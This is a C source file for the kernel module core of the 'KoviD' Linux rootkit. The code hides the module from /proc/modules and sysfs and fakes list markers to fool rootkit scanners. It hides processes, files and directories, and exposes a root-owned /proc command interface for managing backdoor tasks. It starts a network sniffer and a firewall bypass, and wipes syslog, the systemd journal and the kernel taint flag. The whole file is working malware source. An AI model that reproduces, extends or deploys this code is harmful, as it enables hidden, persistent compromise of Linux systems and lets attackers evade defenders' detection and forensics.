/**
 *  KoviD rootkit
 *
 *
 *    ██ ▄█▀ ▒█████   ██▒   █▓ ██▓▓█████▄
 *    ██▄█▒ ▒██▒  ██▒▓██░   █▒▓██▒▒██▀ ██▌
 *   ▓███▄░ ▒██░  ██▒ ▓██  █▒░▒██▒░██   █▌
 *   ▓██ █▄ ▒██   ██░  ▒██ █░░░██░░▓█▄   ▌
 *   ▒██▒ █▄░ ████▓▒░   ▒▀█░  ░██░░▒████▓
 *   ▒ ▒▒ ▓▒░ ▒░▒░▒░    ░ ▐░  ░▓   ▒▒▓  ▒
 *   ░ ░▒ ▒░  ░ ▒ ▒░    ░ ░░   ▒ ░ ░ ▒  ▒
 *   ░ ░░ ░ ░ ░ ░ ▒       ░░   ▒ ░ ░ ░  ░
 *   ░  ░       ░ ░        ░   ░     ░
 *                        ░        ░
 *
 * LKM rootkit by @hash
 *
 */
#include <linux/module.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/tcp.h>
#include <linux/kthread.h>
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/ctype.h>
#include <linux/parser.h>
#include <linux/random.h>

#include "crypto.h"
#include "lkm.h"
#include "fs.h"
#include "version.h"
#include "log.h"

#ifndef MODNAME
#pragma message "Missing \'MODNAME\' compilation directive. See Makefile."
#endif

#ifndef PRCTIMEOUT

// default timeout seconds
// before /proc/<name> is removed
#define _PRCTIMEOUT 360
#else
#define _PRCTIMEOUT PRCTIMEOUT
#endif

enum { PRC_RESET = -1, PRC_READ, PRC_DEC, PRC_TIMEOUT = _PRCTIMEOUT };

struct task_struct *tsk_sniff = NULL;
struct task_struct *tsk_prc = NULL;

static struct proc_dir_entry *rrProcFileEntry;
struct __lkmmod_t {
	struct module *this_mod;
};
static DEFINE_MUTEX(prc_mtx);
static DEFINE_SPINLOCK(msguser_spin);
static struct kv_crypto_st *kvmgc_unhidekey;

// Makefile auto-generated - DO NOT EDIT
uint64_t auto_unhidekey = 0x0000000000000000;

extern uint64_t auto_bdkey;

#ifndef __x86_64__
#error "Support is only for x86-64"
#endif

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("whatever coorp");
MODULE_INFO(intree, "Y");

static struct list_head *mod_list;
static const struct __lkmmod_t lkmmod = {
	.this_mod = THIS_MODULE,
};

// kernel structures so the compiler
// can know about sizes and data types
// kernel/params.c
struct param_attribute {
	struct module_attribute mattr;
	const struct kernel_param *param;
};

struct module_param_attrs {
	unsigned int num;
	struct attribute_group grp;
	struct param_attribute attrs[0];
};

// kernel/module.c
struct module_sect_attr {
	struct module_attribute mattr;
	char *name;
	unsigned long address;
};
struct module_sect_attrs {
	struct attribute_group grp;
	unsigned int nsections;
	struct module_sect_attr attrs[0];
};

// sysfs restoration helpers.
// Mostly copycat from the kernel with
// light modifications to handle only a subset
// of sysfs files
static ssize_t show_refcnt(struct module_attribute *mattr,
			   struct module_kobject *mk, char *buffer)
{
	return sprintf(buffer, "%i\n", module_refcount(mk->mod));
}
static struct module_attribute modinfo_refcnt =
	__ATTR(refcnt, 0444, show_refcnt, NULL);

static struct module_attribute *modinfo_attrs[] = {
	&modinfo_refcnt,
	NULL,
};

static void module_remove_modinfo_attrs(struct module *mod)
{
	struct module_attribute *attr;

	attr = &mod->modinfo_attrs[0];
	if (attr && attr->attr.name) {
		sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
		if (attr->free)
			attr->free(mod);
	}
	kfree(mod->modinfo_attrs);
}

static int module_add_modinfo_attrs(struct module *mod)
{
	struct module_attribute *attr;
	struct module_attribute *temp_attr;
	int error = 0;

	mod->modinfo_attrs = kzalloc((sizeof(struct module_attribute) *
				      (ARRAY_SIZE(modinfo_attrs) + 1)),
				     GFP_KERNEL);
	if (!mod->modinfo_attrs)
		return -ENOMEM;

	temp_attr = mod->modinfo_attrs;
	attr = modinfo_attrs[0];
	if (!attr->test || attr->test(mod)) {
		memcpy(temp_attr, attr, sizeof(*temp_attr));
		sysfs_attr_init(&temp_attr->attr);
		error = sysfs_create_file(&mod->mkobj.kobj, &temp_attr->attr);
		if (error)
			goto error_out;
	}

	return 0;

error_out:
	module_remove_modinfo_attrs(mod);
	return error;
}

// Remove the module entries
// in /proc/modules and /sys/module/<MODNAME>
// Also backup references needed for
// _unhide_mod()
struct rmmod_controller {
	struct kobject *parent;
	struct module_sect_attrs *attrs;
};
static struct rmmod_controller rmmod_ctrl;
static DEFINE_SPINLOCK(hiddenmod_spinlock);

static inline void kv_list_del(struct list_head *prev, struct list_head *next)
{
	next->prev = prev;
	prev->next = next;
}

static int _hide_mod(void)
{
	struct list_head this_list;

	if (NULL != mod_list)
		return -EINVAL;

	// sysfs looks more and less
	// like this, before removal:
	//
	// /sys/module/<MODNAME>/
	// ├── coresize
	// ├── holders
	// ├── initsize
	// ├── initstate
	// ├── notes
	// ├── refcnt
	// ├── sections
	// │   ├── __bug_table
	// │   └── __mcount_loc
	// ├── srcversion
	// ├── taint
	// └── uevent

	// Backup and remove this module from /proc/modules
	this_list = lkmmod.this_mod->list;
	mod_list = this_list.prev;
	spin_lock(&hiddenmod_spinlock);

	// bypass original list_del()
	kv_list_del(this_list.prev, this_list.next);

	// To deceive certain rootkit hunters scanning for
	// markers set by list_del(), we perform a swap with
	// LIST_POISON. This strategy should be effective,
	// as long as you don't enable list debugging (lib/list_debug.c).
	this_list.next = (struct list_head *)LIST_POISON2;
	this_list.prev = (struct list_head *)LIST_POISON1;

	spin_unlock(&hiddenmod_spinlock);

	// Backup and remove this module from sysfs
	rmmod_ctrl.attrs = lkmmod.this_mod->sect_attrs;
	rmmod_ctrl.parent = lkmmod.this_mod->mkobj.kobj.parent;
	kobject_del(lkmmod.this_mod->holders_dir->parent);

	// Again, mess with the known marker set by
	// kobject_del()
	lkmmod.this_mod->holders_dir->parent->state_in_sysfs = 1;

	// __module_address will return NULL for us
	// as long as we are "loading"...
	lkmmod.this_mod->state = MODULE_STATE_UNFORMED;

	return 0;
}

// This function is responsible for restoring module entries in both
// /proc/modules and /sys/module/<module>/. After this function is
// executed, the recommended action is to proceed with the rmmod
// command to unload the module safely.
static int _unhide_mod(void)
{
	int err;
	struct kobject *kobj;

	if (!mod_list)
		return -EINVAL;

	// Sysfs is intrinsically linked to kernel objects. In this section,
	// we reinstate only the essential sysfs entries required when
	// performing rmmod.
	//
	// After the restoration process, the sysfs structure will
	// appear as follows:
	//
	// /sys/module/<MODNAME>/
	// ├── holders
	// ├── refcnt
	// └── sections
	//   └── __mcount_loc

	// Sets back the active state
	lkmmod.this_mod->state = MODULE_STATE_LIVE;

	// MODNAME is the parent kernel object
	err = kobject_add(&(lkmmod.this_mod->mkobj.kobj), rmmod_ctrl.parent,
			  "%s", MODNAME);
	if (err)
		goto out_put_kobj;

	kobj = kobject_create_and_add("holders",
				      &(lkmmod.this_mod->mkobj.kobj));
	if (!kobj)
		goto out_put_kobj;

	lkmmod.this_mod->holders_dir = kobj;

	// Create sysfs representation of kernel objects
	err = sysfs_create_group(&(lkmmod.this_mod->mkobj.kobj),
				 &rmmod_ctrl.attrs->grp);
	if (err)
		goto out_put_kobj;

	// Setup attributes
	err = module_add_modinfo_attrs(lkmmod.this_mod);
	if (err)
		goto out_attrs;

	// Restore /proc/module entry
	spin_lock(&hiddenmod_spinlock);

	list_add(&(lkmmod.this_mod->list), mod_list);
	spin_unlock(&hiddenmod_spinlock);
	goto out_put_kobj;

out_attrs:
	// Rewind attributes
	if (lkmmod.this_mod->mkobj.mp) {
		sysfs_remove_group(&(lkmmod.this_mod->mkobj.kobj),
				   &lkmmod.this_mod->mkobj.mp->grp);
		if (lkmmod.this_mod->mkobj.mp)
			kfree(lkmmod.this_mod->mkobj.mp->grp.attrs);
		kfree(lkmmod.this_mod->mkobj.mp);
		lkmmod.this_mod->mkobj.mp = NULL;
	}

out_put_kobj:
	// Decrement refcount
	kobject_put(&(lkmmod.this_mod->mkobj.kobj));
	mod_list = NULL;

	return err;
}

struct msguser_t {
	char bytes[PAGE_SIZE];
	bool ready;
};
static struct msguser_t MsgUser;

enum { MSG_INT, MSG_ULONG, MSG_ADDR };

static void _set_msguser(void *bytes, int type)
{
	spin_lock(&msguser_spin);

	if (!bytes) {
		prerr("%s: Invalid argument\n", __FUNCTION__);
		spin_unlock(&msguser_spin);
		return;
	}

	memset(&MsgUser, 0, sizeof(struct msguser_t));

	switch (type) {
	case MSG_INT: {
		int *val = (int *)bytes;
		snprintf(MsgUser.bytes, PAGE_SIZE - 1, "%d", *val);
		MsgUser.ready = true;
	} break;
	case MSG_ULONG: {
		unsigned long *val = (unsigned long *)bytes;
		snprintf(MsgUser.bytes, PAGE_SIZE - 1, "%lu", *val);
		MsgUser.ready = true;
	} break;
	case MSG_ADDR: {
		unsigned long *val = (unsigned long *)bytes;
		snprintf(MsgUser.bytes, PAGE_SIZE - 1, "%lx", *val);
		MsgUser.ready = true;
	} break;
	default:
		prerr("%s: Invalid argument type %d\n", __FUNCTION__, type);
		break;
	}

	spin_unlock(&msguser_spin);
}

static bool msguser_enable;
static void _set_msguser_retcode(void *bytes, int type)
{
	if (msguser_enable)
		_set_msguser(bytes, type);
}

static inline void _msguser_toggle(bool enable)
{
	msguser_enable = enable;
	_set_msguser(&msguser_enable, MSG_INT);
}

// XXX: fix/improve this API
static struct msguser_t *get_msguser(bool *ready)
{
	spin_lock(&msguser_spin);
	if (MsgUser.ready) {
		if (ready)
			*ready = MsgUser.ready;
		MsgUser.ready = false;
		spin_unlock(&msguser_spin);
		return &MsgUser;
	}
	spin_unlock(&msguser_spin);
	return NULL;
}

static int proc_dummy_show(struct seq_file *seq, void *data)
{
	seq_printf(seq, "0\n");
	return 0;
}

static int open_cb(struct inode *ino, struct file *fptr)
{
	return single_open(fptr, proc_dummy_show, NULL);
}

static ssize_t _seq_read(struct file *fptr, char __user *buffer, size_t count,
			 loff_t *ppos)
{
	ssize_t rv = 0;
	bool ready = false;
	struct msguser_t *umsg;
	char *kbuf = NULL;

	if (*ppos > 0 || !count)
		return 0;

	umsg = get_msguser(&ready);
	if (!umsg || !ready) {
		rv = -ENOENT;
		goto leave;
	}

	kbuf = kzalloc(PAGE_SIZE, GFP_KERNEL);
	if (!kbuf) {
		rv = -EFAULT;
		goto leave;
	}

	rv = snprintf(kbuf, PAGE_SIZE - 1, "%s\n", umsg->bytes);
	if (copy_to_user(buffer, kbuf, rv)) {
		rv = -EFAULT;
		goto cleanup;
	}

	*ppos = rv;

cleanup:
	if (kbuf)
		kfree(kbuf);

leave:
	return rv;
}

// This function removes the proc interface after a
// certain amount of time has passed.
// It can be re-activated using a
// kill signal.
static int proc_timeout(unsigned int t)
{
	static unsigned int cnt = PRC_TIMEOUT;

	if (t == PRC_READ)
		return cnt;

	mutex_lock(&prc_mtx);
	if (t == PRC_RESET)
		cnt = PRC_TIMEOUT;
	else if (cnt > 0)
		cnt -= t;
	mutex_unlock(&prc_mtx);

	return cnt;
}

enum {
	Opt_unknown = -1,

	// task (PID) operations
	Opt_hide_task_backdoor,
	Opt_list_hidden_tasks,
	Opt_list_all_tasks,
	Opt_list_back_door,
	Opt_rename_hidden_task,

	// this module stealth
	Opt_hide_module,
	Opt_unhide_module,

	// file stealth operations
	Opt_hide_file,
	Opt_hide_directory,
	Opt_hide_file_anywhere,
	Opt_list_hidden_files,
	Opt_unhide_file,
	Opt_unhide_directory,

	// misc
	Opt_journalclt,
	Opt_fetch_base_address,
	Opt_signal_task_stop,
	Opt_signal_task_cont,
	Opt_signal_task_kill,
	Opt_syslog_clear,
	Opt_taint_clear,
	Opt_output_enable,
	Opt_output_disable,

#ifdef DEBUG_RING_BUFFER
	// debug
	Opt_get_bdkey,
	Opt_get_unhidekey,
#endif

};

static const match_table_t tokens = {
	{ Opt_hide_task_backdoor, "hide-task-backdoor=%d" },
	{ Opt_list_hidden_tasks, "list-hidden-tasks" },
	{ Opt_list_all_tasks, "list-all-tasks" },
	{ Opt_list_back_door, "list-backdoor" },
	{ Opt_rename_hidden_task, "rename-task=%d,%s" },

	{ Opt_hide_module, "hide-lkm" },
	{ Opt_unhide_module, "unhide-lkm=%s" },

	{ Opt_hide_file, "hide-file=%s" },
	{ Opt_hide_directory, "hide-directory=%s" },
	{ Opt_hide_file_anywhere, "hide-file-anywhere=%s" },
	{ Opt_list_hidden_files, "list-hidden-files" },
	{ Opt_unhide_file, "unhide-file=%s" },
	{ Opt_unhide_directory, "unhide-directory=%s" },

	{ Opt_journalclt, "journal-flush" },
	{ Opt_fetch_base_address, "base-address=%d" },
	{ Opt_signal_task_stop, "signal-task-stop=%d" },
	{ Opt_signal_task_cont, "signal-task-cont=%d" },
	{ Opt_signal_task_kill, "signal-task-kill=%d" },
	{ Opt_syslog_clear, "syslog-clear" },
	{ Opt_taint_clear, "taint-clear" },
	{ Opt_output_enable, "output-enable" },
	{ Opt_output_disable, "output-disable" },
#ifdef DEBUG_RING_BUFFER
	{ Opt_get_bdkey, "get-bdkey" },
	{ Opt_get_unhidekey, "get-unhidekey" },
#endif
	{ Opt_unknown, NULL }
};

struct userdata_t {
	uint64_t address_value;
	int op;
	bool ok;
};

static void _crypto_cb(const u8 *const buf, size_t buflen, size_t copied,
		       void *userdata)
{
	struct userdata_t *validate = (struct userdata_t *)userdata;

	if (!validate)
		return;

	if (validate->op == Opt_unhide_module) {
		if (validate->address_value) {
			if (validate->address_value == *((uint64_t *)buf))
				validate->ok = true;
		}
	}
#ifdef DEBUG_RING_BUFFER
	else if (validate->op == Opt_get_unhidekey ||
		 validate->op == Opt_get_bdkey) {
		uint64_t val = *((uint64_t *)buf);
		_set_msguser(&val, MSG_ADDR);
	}
#endif
}
static int _run_send_sig(int sig, pid_t pid, bool restart)
{
	int rc = -ESRCH;
	struct hidden_status status = { 0 };

	if (!kv_find_hidden_pid(&status, pid))
		return rc;

	rc = kv_hide_task_by_pid(pid, 0, true);
	if (!rc) {
		rc = kv_send_signal(sig, status.task);
		if (restart) {
			rc = kv_hide_task_by_pid(pid, 0, true);
		}
	}
	return rc;
}

static int _hide_path(const char *s)
{
	struct path path;
	struct kstat stat = { 0 };
	int rc = -EINVAL;

	if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
		// It is filename, no problem because we have path.dentry
		const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
		bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);

		if (is_dir) {
			u64 parent_inode = fs_get_parent_inode(&path);
			rc = fs_add_name_rw_dir(f, stat.ino, parent_inode,
						/*is_dir=*/true);
		} else {
			rc = fs_add_name_rw(f, stat.ino);
		}

		path_put(&path);
		kv_mem_free(&f);
	} else if (*s != '.' && *s != '/') {
		// add with unknown inode number
		rc = fs_add_name_rw(s, /*ino=*/0);
	}

	return rc;
}

#define CMD_MAXLEN 128
static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
			loff_t *offset)
{
	int rc = -EINVAL;
	pid_t pid;
	char param[CMD_MAXLEN + 1] = { 0 };
	decrypt_callback user_cb = (decrypt_callback)_crypto_cb;

	if (copy_from_user(param, user, CMD_MAXLEN))
		return -EFAULT;

	// exclude trailing stuff we don't care
	param[strcspn(param, "\r\n")] = 0;

	pid = (pid_t)simple_strtol((const char *)param, NULL, 10);
	if (pid > 1) {
		rc = kv_hide_task_by_pid(pid, 0, true);
		_set_msguser_retcode(&rc, MSG_INT);
	} else {
		substring_t args[MAX_OPT_ARGS];

		int tok = match_token(param, tokens, args);
		switch (tok) {
		case Opt_list_all_tasks:
			kv_show_all_tasks();
			break;
		case Opt_hide_task_backdoor:
			if (sscanf(args[0].from, "%d", &pid) == 1)
				rc = kv_hide_task_by_pid(pid, 1, true);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_list_hidden_tasks:
			kv_show_saved_tasks();
			break;
		case Opt_list_back_door:
			kv_show_active_backdoors();
			break;
		case Opt_rename_hidden_task:
			if (sscanf(args[0].from, "%d", &pid) == 1)
				rc = kv_rename_task(pid, args[1].from);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_hide_module:
			rc = _hide_mod();
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_unhide_module: {
			uint64_t address_value = 0;
			struct userdata_t validate = { 0 };

			if ((sscanf(args[0].from, "%llx", &address_value) ==
			     1)) {
				validate.address_value = address_value;
				validate.op = Opt_unhide_module;

				kv_decrypt(kvmgc_unhidekey, user_cb, &validate);
				if (validate.ok == true) {
					rc = _unhide_mod();
				}
			}
			_set_msguser_retcode(&rc, MSG_INT);
		} break;
		case Opt_hide_file:
		case Opt_hide_directory: {
			char *s = args[0].from;
			rc = _hide_path(s);
			_set_msguser_retcode(&rc, MSG_INT);
		} break;
		case Opt_unhide_file:
		case Opt_unhide_directory:
			rc = fs_del_name(args[0].from);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
			// Currently, directories must
			// be added individually: use hide-directory
		case Opt_hide_file_anywhere:
			rc = fs_add_name_rw(args[0].from, 0);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_list_hidden_files:
			fs_list_names();
			break;
		case Opt_journalclt: {
			char *cmd[] = { JOURNALCTL, "--rotate", NULL };
			if (!kv_run_system_command(cmd, false, false)) {
				cmd[1] = "--vacuum-time=1s";
				rc = kv_run_system_command(cmd, false, false);
			}
			_set_msguser_retcode(&rc, MSG_INT);
		} break;
#ifdef DEBUG_RING_BUFFER
		case Opt_get_bdkey:
		case Opt_get_unhidekey: {
			struct userdata_t validate = { 0 };
			struct kv_crypto_st *mgc =
				(tok == Opt_get_unhidekey ? kvmgc_unhidekey :
							    kv_sock_get_mgc());
			validate.op = tok;
			kv_decrypt(mgc, user_cb, &validate);
		} break;
#endif
		case Opt_fetch_base_address: {
			if (sscanf(args[0].from, "%d", &pid) == 1) {
				unsigned long base;
				base = kv_get_elf_vm_start(pid);
				_set_msguser(&base, MSG_ADDR);
			}
		} break;
		case Opt_signal_task_stop:
			if (sscanf(args[0].from, "%d", &pid) == 1)
				rc = _run_send_sig(SIGSTOP, pid, true);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_signal_task_cont:
			if (sscanf(args[0].from, "%d", &pid) == 1)
				rc = _run_send_sig(SIGCONT, pid, true);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_signal_task_kill:
			if (sscanf(args[0].from, "%d", &pid) == 1)
				rc = _run_send_sig(SIGKILL, pid, false);
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_syslog_clear:
			rc = sys_do_syslog_clear();
			_set_msguser_retcode(&rc, MSG_INT);
			break;
		case Opt_taint_clear: {
			struct kernel_syscalls *kaddr = kv_kall_load_addr();
			int oldmask = 0;
			char uval[32 + 1] = { 0 };
			if (kaddr)
				oldmask = kv_reset_tainted(kaddr->tainted);
			snprintf(uval, 32, "%d", oldmask);
			_set_msguser_retcode(&oldmask, MSG_INT);

		} break;
		case Opt_output_enable:
			_msguser_toggle(true);
			break;
		case Opt_output_disable:
			_msguser_toggle(false);
			break;
		default:
			break;
		}
	}

	// Interactions with UI will reset
	///proc interface timeout */
	proc_timeout(PRC_RESET);

	return size;
}

// proc file callbacks and defs
#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 6, 0)
static const struct file_operations proc_file_fops = {
	.owner = THIS_MODULE,
	.open = open_cb,
	.read = _seq_read,
	.release = seq_release,
	.write = write_cb,
};
#else
static const struct proc_ops proc_file_fops = {
	.proc_open = open_cb,
	.proc_read = _seq_read,
	.proc_release = seq_release,
	.proc_write = write_cb,
};
#endif

int kv_is_proc_interface_loaded(void)
{
	if (rrProcFileEntry)
		return true;
	return false;
}

int kv_add_proc_interface(void)
{
	int lock = 0;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
	kuid_t kuid;
	kgid_t kgid;
#endif
	// is proc loaded?
	if (rrProcFileEntry)
		return 0;

try_reload:
#ifdef DEBUG_RING_BUFFER
	rrProcFileEntry = proc_create(PROCNAME, 0666, NULL, &proc_file_fops);
#else
	rrProcFileEntry = proc_create(PROCNAME, S_IRUSR, NULL, &proc_file_fops);
#endif
	if (lock && !rrProcFileEntry)
		goto proc_file_error;
	if (!lock) {
		if (!rrProcFileEntry) {
			lock = 1;
			kv_remove_proc_interface();
			goto try_reload;
		}
	}

	// set proc file maximum size & user as root
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0)
	rrProcFileEntry->size = PAGE_SIZE;
	rrProcFileEntry->uid = 0;
	rrProcFileEntry->gid = 0;
#else
	proc_set_size(rrProcFileEntry, PAGE_SIZE);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0)
	kuid.val = 0;
	kgid.val = 0;
	proc_set_user(rrProcFileEntry, kuid, kgid);
#else
	proc_set_user(rrProcFileEntry, 0, 0);
#endif
#endif
	proc_timeout(PRC_READ);
	if (tsk_prc)
		kthread_unpark(tsk_prc);
	goto leave;
proc_file_error:
	prinfo("Could not create proc file.\n");
	return 0;
leave:
	prinfo("/proc/%s loaded, timeout: %ds\n", PROCNAME, PRC_TIMEOUT);
	return 1;
}

// Can be called from __exit
// and outside of proc watchdog
// context
static void _proc_rm_wrapper(void)
{
	mutex_lock(&prc_mtx);
	if (rrProcFileEntry) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 9, 0)
		remove_proc_entry(PROCNAME, NULL);
#else
		proc_remove(rrProcFileEntry);
#endif
		rrProcFileEntry = NULL;
		prinfo("/proc/%s unloaded.\n", PROCNAME);
	}
	mutex_unlock(&prc_mtx);
}

void kv_remove_proc_interface(void)
{
	_proc_rm_wrapper();
	proc_timeout(PRC_RESET);
	kthread_park(tsk_prc);
}

static int _proc_watchdog(void *unused)
{
#ifndef DEBUG_RING_BUFFER
#endif
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	struct kernel_syscalls *kaddr = kv_kall_load_addr();
#endif

	for (;;) {
		if (kthread_should_park())
			kthread_parkme();
		if (kthread_should_stop()) {
			_proc_rm_wrapper();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
			kaddr->k_do_exit(0);
#else
			do_exit(0);
#endif
		}
		if (kv_is_proc_interface_loaded()) {
			if (proc_timeout(PRC_READ))
				proc_timeout(PRC_DEC);
			else {
				prinfo("/proc/kovid timeout\n");
				kv_remove_proc_interface();
			}
		}
		ssleep(1);
	}
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	kaddr->k_do_exit(0);
#else
	do_exit(0);
#endif
	return 0;
}

static void _unroll_init(void)
{
	// give time for any temporary thread
	//to finish
	ssleep(5);

	if (tsk_prc && !IS_ERR(tsk_prc)) {
		kthread_unpark(tsk_prc);
		kthread_stop(tsk_prc);
	}

	_proc_rm_wrapper();
	sys_deinit();
	kv_pid_cleanup();
}

static int __init kv_init(void)
{
	u8 buf[16] = { 0 };
	int rv = 0;
	char *procname_err = "";
	const char **name;
	struct kernel_syscalls *kaddr = NULL;

	// Hide these names from write() fs output
	static const char *hide_names[] = { MODNAME, UUIDGEN ".ko",
					    UUIDGEN ".sh", PROCNAME, NULL };

	// show current version for when running in debug mode
	prinfo("version %s\n", KOVID_VERSION);

	if (strlen(PROCNAME) == 0) {
		procname_err =
			"Empty PROCNAME build parameter. Check Makefile.";
	} else if (!strncmp(PROCNAME, "changeme", 5)) {
		procname_err = "You must rename PROCNAME. Check Makefile.";
	} else if (!strncmp(PROCNAME, "kovid", 5) ||
		   !strncmp(PROCNAME, MODNAME, strlen(PROCNAME))) {
		procname_err =
			"PROCNAME should not be same as module name. Check Makefile.";
	}

	if (*procname_err != 0)
		goto procname_missing;

	if (!kv_pid_init(kv_kall_load_addr()))
		goto addr_error;

	if (!sys_init())
		goto sys_init_error;

	kaddr = kv_kall_load_addr();
	if (!kaddr)
		goto sys_init_error;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
	if (!kaddr->k_do_exit)
		goto sys_init_error;
#endif

	tsk_prc = kthread_run(_proc_watchdog, NULL, THREAD_PROC_NAME);
	if (!tsk_prc)
		goto background_error;

	// Init crypto engine
	if (kv_crypto_engine_init() < 0) {
		prerr("Failed to initialise crypto engine\n");
		goto crypto_error;
	}

	if (!(kvmgc_unhidekey = kv_crypto_mgc_init())) {
		prerr("Failed to encrypt unhidekey\n");
		kv_crypto_engine_deinit();
		goto crypto_error;
	}

	memcpy(buf, &auto_unhidekey, 8);
	kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
	auto_unhidekey = 0;

	tsk_sniff = kv_sock_start_sniff();
	if (!tsk_sniff)
		goto background_error;

	if (!kv_sock_start_fw_bypass()) {
		prwarn("Error loading fw_bypass\n");
	}

	// hide kthreads
	kv_hide_task_by_pid(tsk_sniff->pid, 0, true);
	kv_hide_task_by_pid(tsk_prc->pid, 0, true);

	// hide magic filenames, directories and processes
	for (name = hide_names; *name != NULL; ++name) {
		fs_add_name_ro(*name, 0);
	}

#ifndef DEBUG_RING_BUFFER
	_hide_mod();
#endif

	kv_reset_tainted(kaddr->tainted);

	prinfo("loaded.\n");

#ifndef DEBUG_RING_BUFFER
	sys_do_syslog_clear();
#endif

	return rv;

crypto_error:
	prerr("Crypto init error\n");
	goto error;
background_error:
	prerr("Could not load basic functionality.\n");
	goto error;
sys_init_error:
	prerr("Could not load syscalls hooks\n");
	goto error;
addr_error:
	prerr("Could not get kernel function address, proc file not created.\n");
	goto error;
procname_missing:
	prerr("%s\n", procname_err);
error:
	prerr("Unrolling\n");
	_unroll_init();

	return -EFAULT;
}

static void __exit kv_cleanup(void)
{
	sys_deinit();
	kv_pid_cleanup();

	if (tsk_sniff && !IS_ERR(tsk_sniff)) {
		prinfo("stop sniff thread\n");
		kv_sock_stop_sniff(tsk_sniff);
	}

	kv_sock_stop_fw_bypass();

	if (tsk_prc && !IS_ERR(tsk_prc)) {
		prinfo("stop proc timeout thread\n");
		kthread_unpark(tsk_prc);
		kthread_stop(tsk_prc);
	}

	fs_names_cleanup();

	kv_crypto_engine_deinit();

	prinfo("unloaded.\n");
}

module_init(kv_init);
module_exit(kv_cleanup);
